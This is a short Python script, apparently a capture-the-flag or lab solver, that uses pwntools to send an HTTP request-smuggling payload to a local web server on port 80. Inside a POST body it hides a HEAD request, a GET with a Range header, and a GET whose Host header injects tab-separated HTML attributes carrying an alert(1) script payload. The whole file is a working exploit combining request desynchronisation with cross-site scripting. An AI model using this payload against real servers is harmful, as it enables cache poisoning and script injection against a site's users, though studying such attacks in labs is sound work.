# test.py

import pwn
# pwn.context.log_level = "DEBUG"

# HOST = "localhost"
HOST = "localhost"

io = pwn.remote(HOST, "80")

smuggled = "HEAD / HTTP/1.1\r\nHost: a\r\n\r\nGET / HTTP/1.1\r\nHost: script\r\nRange: bytes=0-0\r\n\r\nGET /a HTTP/1.1\r\nHost: \tid=x\ttabindex=1\tnfocus=alert(1)\tautofocus\t\r\n\r\n"
io.send(f"POST /a HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: {len(smuggled)}\r\n\r\n{smuggled}".encode())

res = io.recvall(timeout=1)
print(res.decode().replace("\r", ""))